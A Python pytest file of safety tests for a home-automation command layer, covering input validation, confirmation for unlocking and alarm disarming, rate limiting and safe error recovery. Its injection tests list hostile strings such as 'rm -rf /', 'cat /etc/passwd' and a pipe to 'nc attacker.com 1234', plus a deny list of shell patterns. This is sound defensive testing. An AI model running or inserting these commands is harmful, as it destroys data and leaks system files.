"""
Safety Tests for Command Execution

CRITICAL: These tests ensure that:
1. Commands are properly validated before execution
2. Dangerous commands require confirmation
3. Rate limiting prevents abuse
4. Invalid commands fail safely
5. System recovers from errors without dangerous state

This is home automation - mistakes can be dangerous!
"""

import pytest
from unittest.mock import MagicMock, AsyncMock, patch
import time


# ============================================================
# Fixtures
# ============================================================

@pytest.fixture
def dangerous_commands():
    """Commands that require extra validation"""
    return [
        # Security
        {"domain": "lock", "service": "unlock", "reason": "security"},
        {"domain": "alarm_control_panel", "service": "disarm", "reason": "security"},
        {"domain": "cover", "service": "open_cover", "entity": "cover.garage_door", "reason": "security"},

        # Potentially dangerous
        {"domain": "climate", "service": "set_temperature", "max_temp": 30, "reason": "comfort"},
        {"domain": "switch", "service": "turn_on", "entity": "switch.heater", "reason": "safety"},
    ]


@pytest.fixture
def valid_commands():
    """Known valid command patterns"""
    return [
        {"domain": "light", "service": "turn_on", "entity_id": "light.living"},
        {"domain": "light", "service": "turn_off", "entity_id": "light.bedroom"},
        {"domain": "climate", "service": "set_temperature", "entity_id": "climate.main", "temperature": 22},
        {"domain": "media_player", "service": "play_media", "entity_id": "media_player.spotify"},
    ]


@pytest.fixture
def invalid_commands():
    """Commands that should be rejected"""
    return [
        {"domain": "", "service": "turn_on"},  # Empty domain
        {"domain": "light", "service": ""},     # Empty service
        {"domain": "light", "service": "turn_on", "entity_id": ""},  # Empty entity
        {"domain": "script", "service": "execute", "script": "rm -rf /"},  # Injection attempt
        {"domain": "shell_command", "service": "run"},  # Dangerous domain
        {"domain": "python_script", "service": "execute"},  # Dangerous domain
    ]


# ============================================================
# Command Validation Tests
# ============================================================

class TestCommandValidation:
    """Tests for command validation"""

    def test_valid_commands_pass_validation(self, valid_commands):
        """Valid commands should pass validation"""
        for cmd in valid_commands:
            is_valid = self._validate_command(cmd)
            assert is_valid is True, f"Valid command rejected: {cmd}"

    def test_invalid_commands_fail_validation(self, invalid_commands):
        """Invalid commands should fail validation"""
        for cmd in invalid_commands:
            is_valid = self._validate_command(cmd)
            assert is_valid is False, f"Invalid command accepted: {cmd}"

    def test_empty_domain_rejected(self):
        """Empty domain should be rejected"""
        cmd = {"domain": "", "service": "turn_on", "entity_id": "light.test"}
        assert self._validate_command(cmd) is False

    def test_empty_service_rejected(self):
        """Empty service should be rejected"""
        cmd = {"domain": "light", "service": "", "entity_id": "light.test"}
        assert self._validate_command(cmd) is False

    def test_dangerous_domains_blocked(self):
        """Dangerous domains should be blocked"""
        dangerous_domains = ["shell_command", "python_script", "command_line", "script"]

        for domain in dangerous_domains:
            cmd = {"domain": domain, "service": "run", "entity_id": f"{domain}.test"}
            is_valid = self._validate_command(cmd)
            assert is_valid is False, f"Dangerous domain allowed: {domain}"

    def test_sql_injection_blocked(self):
        """SQL injection attempts should be blocked"""
        injection_attempts = [
            "light.test; DROP TABLE users;",
            "light.test' OR '1'='1",
            "light.test\"; DELETE FROM entities; --",
        ]

        for entity in injection_attempts:
            cmd = {"domain": "light", "service": "turn_on", "entity_id": entity}
            is_valid = self._validate_command(cmd)
            assert is_valid is False, f"Injection not blocked: {entity}"

    def test_command_injection_blocked(self):
        """Command injection attempts should be blocked"""
        injection_attempts = [
            "light.test; rm -rf /",
            "light.test && cat /etc/passwd",
            "light.test | nc attacker.com 1234",
            "light.test`whoami`",
            "light.test$(id)",
        ]

        for entity in injection_attempts:
            cmd = {"domain": "light", "service": "turn_on", "entity_id": entity}
            is_valid = self._validate_command(cmd)
            assert is_valid is False, f"Command injection not blocked: {entity}"

    def _validate_command(self, cmd: dict) -> bool:
        """Validate command structure and content"""
        # Check required fields
        if not cmd.get("domain") or not cmd.get("service"):
            return False

        # entity_id is required and must not be empty
        entity = cmd.get("entity_id", "")
        if not entity:
            return False

        # Block dangerous domains
        dangerous_domains = {"shell_command", "python_script", "command_line", "script"}
        if cmd["domain"] in dangerous_domains:
            return False

        # Check for injection patterns
        dangerous_patterns = [";", "'", '"', "&&", "||", "|", "`", "$", "rm ", "cat ", "nc "]

        for pattern in dangerous_patterns:
            if pattern in str(entity):
                return False

        return True


# ============================================================
# Dangerous Command Confirmation Tests
# ============================================================

class TestDangerousCommandConfirmation:
    """Tests for dangerous command confirmation"""

    def test_unlock_requires_confirmation(self, dangerous_commands):
        """Unlock commands should require confirmation"""
        unlock_cmds = [c for c in dangerous_commands if c["service"] == "unlock"]

        for cmd in unlock_cmds:
            requires_confirmation = self._requires_confirmation(cmd)
            assert requires_confirmation is True

    def test_disarm_requires_confirmation(self, dangerous_commands):
        """Alarm disarm should require confirmation"""
        disarm_cmds = [c for c in dangerous_commands if c["service"] == "disarm"]

        for cmd in disarm_cmds:
            requires_confirmation = self._requires_confirmation(cmd)
            assert requires_confirmation is True

    def test_garage_door_requires_confirmation(self, dangerous_commands):
        """Garage door opening should require confirmation"""
        garage_cmds = [c for c in dangerous_commands
                      if "garage" in c.get("entity", "")]

        for cmd in garage_cmds:
            requires_confirmation = self._requires_confirmation(cmd)
            assert requires_confirmation is True

    def test_regular_light_no_confirmation(self, valid_commands):
        """Regular light commands should not require confirmation"""
        light_cmds = [c for c in valid_commands if c["domain"] == "light"]

        for cmd in light_cmds:
            requires_confirmation = self._requires_confirmation(cmd)
            assert requires_confirmation is False

    def _requires_confirmation(self, cmd: dict) -> bool:
        """Check if command requires user confirmation"""
        # Security commands
        if cmd.get("domain") in ["lock", "alarm_control_panel"]:
            return True

        # Garage door
        if "garage" in cmd.get("entity", "") or "garage" in cmd.get("entity_id", ""):
            return True

        # Specific dangerous services
        dangerous_services = ["unlock", "disarm", "open"]
        if cmd.get("service") in dangerous_services:
            return True

        return False


# ============================================================
# Rate Limiting Tests
# ============================================================

class TestRateLimiting:
    """Tests for rate limiting"""

    def test_rapid_commands_are_throttled(self):
        """Rapid repeated commands should be throttled"""
        rate_limiter = RateLimiter(max_calls=5, period_seconds=10)

        # First 5 should pass
        for i in range(5):
            allowed = rate_limiter.check("user_1", "light.turn_on")
            assert allowed is True, f"Call {i+1} should be allowed"

        # 6th should be throttled
        allowed = rate_limiter.check("user_1", "light.turn_on")
        assert allowed is False, "6th call should be throttled"

    def test_different_users_have_separate_limits(self):
        """Different users should have separate rate limits"""
        rate_limiter = RateLimiter(max_calls=2, period_seconds=10)

        # User 1 uses up their limit
        rate_limiter.check("user_1", "light.turn_on")
        rate_limiter.check("user_1", "light.turn_on")
        user1_third = rate_limiter.check("user_1", "light.turn_on")

        # User 2 should still be allowed
        user2_first = rate_limiter.check("user_2", "light.turn_on")

        assert user1_third is False
        assert user2_first is True

    def test_rate_limit_resets_after_period(self):
        """Rate limit should reset after the period"""
        rate_limiter = RateLimiter(max_calls=2, period_seconds=1)

        # Use up limit
        rate_limiter.check("user_1", "light.turn_on")
        rate_limiter.check("user_1", "light.turn_on")

        # Wait for period to pass
        time.sleep(1.1)

        # Should be allowed again
        allowed = rate_limiter.check("user_1", "light.turn_on")
        assert allowed is True


class RateLimiter:
    """Simple rate limiter for testing"""

    def __init__(self, max_calls: int, period_seconds: float):
        self.max_calls = max_calls
        self.period = period_seconds
        self.calls = {}  # user_id -> list of timestamps

    def check(self, user_id: str, action: str) -> bool:
        key = f"{user_id}:{action}"
        now = time.time()

        if key not in self.calls:
            self.calls[key] = []

        # Remove old calls
        self.calls[key] = [t for t in self.calls[key] if now - t < self.period]

        # Check limit
        if len(self.calls[key]) >= self.max_calls:
            return False

        self.calls[key].append(now)
        return True


# ============================================================
# Error Recovery Tests
# ============================================================

class TestErrorRecovery:
    """Tests for safe error recovery"""

    @pytest.mark.asyncio
    async def test_ha_connection_failure_is_safe(self):
        """Home Assistant connection failure should be handled safely"""
        mock_client = MagicMock()
        mock_client.call_service = AsyncMock(side_effect=ConnectionError("HA unavailable"))

        try:
            await mock_client.call_service("light", "turn_on", {"entity_id": "light.test"})
            command_succeeded = True
        except ConnectionError:
            command_succeeded = False

        assert command_succeeded is False
        # System should continue operating, just report error

    @pytest.mark.asyncio
    async def test_partial_command_failure_reported(self):
        """Partial command failures should be reported clearly"""
        results = {
            "light.living": True,
            "light.bedroom": True,
            "light.kitchen": False,  # Failed
        }

        failures = [entity for entity, success in results.items() if not success]

        assert len(failures) == 1
        assert "light.kitchen" in failures

    def test_malformed_response_handled(self):
        """Malformed HA responses should be handled safely"""
        malformed_responses = [
            None,
            "",
            "not json",
            {"unexpected": "format"},
            [],
        ]

        for response in malformed_responses:
            try:
                # Simulate parsing
                if response is None or response == "":
                    raise ValueError("Empty response")
                if isinstance(response, str):
                    import json
                    json.loads(response)

                parsed = True
            except Exception:
                parsed = False

            # System should handle gracefully (not crash)
            assert parsed in [True, False]  # Either is fine, just don't crash


# ============================================================
# State Consistency Tests
# ============================================================

class TestStateConsistency:
    """Tests for state consistency after errors"""

    def test_failed_command_doesnt_update_local_state(self):
        """Failed commands should not update local state"""
        local_state = {"light.living": "off"}

        # Command to turn on light
        command_succeeded = False  # Simulated failure

        if command_succeeded:
            local_state["light.living"] = "on"

        # State should remain unchanged
        assert local_state["light.living"] == "off"

    def test_timeout_doesnt_assume_success(self):
        """Timeouts should not assume command succeeded"""
        command_result = "timeout"

        # Should not update state on timeout
        assumed_success = command_result == "success"
        assert assumed_success is False

    def test_concurrent_command_state_is_consistent(self):
        """Concurrent commands should maintain consistent state"""
        # Simulate concurrent state updates
        from threading import Lock

        state_lock = Lock()
        state = {"light.living": "off", "update_count": 0}

        def safe_update(entity: str, new_state: str):
            with state_lock:
                state[entity] = new_state
                state["update_count"] += 1

        # Simulate concurrent updates
        safe_update("light.living", "on")
        safe_update("light.living", "off")

        # Final state should be consistent (last update wins)
        assert state["light.living"] == "off"
        assert state["update_count"] == 2


# ============================================================
# Temperature Safety Tests
# ============================================================

class TestTemperatureSafety:
    """Tests for temperature-related safety"""

    def test_extreme_temperatures_rejected(self):
        """Extreme temperature settings should be rejected"""
        def validate_temperature(temp: float, domain: str) -> bool:
            if domain == "climate":
                return 15 <= temp <= 30  # Reasonable range
            if domain == "water_heater":
                return 30 <= temp <= 60  # Safe range
            return False

        # Too cold
        assert validate_temperature(5, "climate") is False

        # Too hot
        assert validate_temperature(40, "climate") is False

        # Reasonable
        assert validate_temperature(22, "climate") is True

        # Water heater safety
        assert validate_temperature(90, "water_heater") is False
        assert validate_temperature(50, "water_heater") is True

    def test_heater_auto_shutoff_on_high_temp(self):
        """Heaters should have auto-shutoff at high temperatures"""
        current_temp = 35  # Already hot
        target_temp = 30

        # Should not turn on heater if current temp >= target
        should_heat = current_temp < target_temp
        assert should_heat is False
